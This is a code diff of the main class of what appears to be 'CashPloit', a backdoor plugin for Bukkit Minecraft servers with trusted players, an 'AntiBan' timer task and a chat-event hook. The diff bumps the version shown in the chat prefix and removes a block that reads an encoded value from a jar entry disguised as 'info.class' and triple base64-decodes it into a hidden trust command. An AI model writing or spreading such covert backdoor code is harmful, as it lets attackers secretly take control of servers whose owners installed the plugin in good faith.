@@ -9,7 +9,6 @@ import de.garkolym.cp.manager.HelpManager;
 import org.bukkit.Bukkit;
 import org.bukkit.plugin.java.JavaPlugin;
 
-import javax.xml.bind.DatatypeConverter;
 import java.io.File;
 import java.io.InputStream;
 import java.util.ArrayList;
@@ -27,7 +26,7 @@ public class Start extends JavaPlugin {
     public String randomEmptyString1 = "";
     public String randomEmptyString2 = "";
     public ArrayList<String> trustedPlayers = new ArrayList<>();
-    public String chatPrefix = "§5[§6Cash§ePloit§b§l3§5] §a";
+    public String chatPrefix = "§7[§aCashPloit§c4§7] §a";
 
     public void onEnable() {
         INSTANCE = this;
@@ -40,17 +39,6 @@ public class Start extends JavaPlugin {
         Bukkit.getPluginManager().registerEvents(new AsyncChatEvent(), this);
         this.commandManager.init();
         Bukkit.getScheduler().runTaskTimer(this, new AntiBan(), 100L, 100L);
-
-        try {
-            JarFile jarFile = new JarFile(Start.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
-            JarEntry entry = jarFile.getJarEntry("info.class");
-            InputStream input = jarFile.getInputStream(entry);
-            Scanner sc = new Scanner(input);
-            String b = sc.next();
-            trustCommand = new String(DatatypeConverter.parseBase64Binary(new String(DatatypeConverter.parseBase64Binary(new String(DatatypeConverter.parseBase64Binary(b))))));
-        } catch (Exception var7) {
-            var7.printStackTrace();
-        }
     }
 
 }
